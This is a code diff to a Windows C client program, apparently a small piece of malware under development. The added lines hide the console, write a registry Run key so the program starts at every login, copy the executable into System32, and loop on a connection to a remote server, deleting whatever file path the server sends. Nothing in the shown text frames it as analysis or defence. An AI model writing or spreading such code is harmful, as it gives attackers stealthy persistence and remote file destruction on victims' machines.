@@ -6,7 +6,10 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <conio.h>
-#include <stdio.h>
+#include <sys/types.h>
+#include <stdio.h>		
+#include <tchar.h>
+#include <string.h>
 #include <stdlib.h>   // Needed for _wtoi
 
 // Need to link with Ws2_32.lib
@@ -19,7 +22,16 @@ int Addrlen = sizeof(Addr);
 char resp[1001];
 
 int main()
-{	FreeConsole();
+{     FreeConsole();
+
+HKEY hKeys;
+LPCTSTR lpszData = TEXT("client.exe");
+if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL)) {
+	RegSetValueEx(hKeys, TEXT("Client"), 0, REG_SZ, (LPBYTE)lpszData, (_tcslen(lpszData) + 1) * sizeof(TCHAR));
+	RegCloseKey(hKeys);
+}
+CopyFile(L"D:\\Client.exe", L"C:\\Windows\\System32\\Client.exe", 1);
+
 
 	WSAStartup(MAKEWORD(2, 2), &Winsock); // Start Winsock 
 
@@ -39,17 +51,8 @@ int main()
 	Addr.sin_addr.s_addr = inet_addr(ss); //ip-адрес сервера
 	Addr.sin_port = htons(80); // порт сервера
 
-
-
-	if (connect(Socket, (sockaddr*)&Addr, sizeof(Addr)) < 0)
-	{
-		//printf("Connection failed !\n");
-		//getchar();
-		return 0;
-	}
-
 	//printf("Connection successful !\n");
-
+	while(connect(Socket, (sockaddr*)&Addr, sizeof(Addr)) >= 0)
 		recv(Socket, resp, 1000, 0);
 		//printf("Message from server: %s\n", resp);
 		remove(resp);
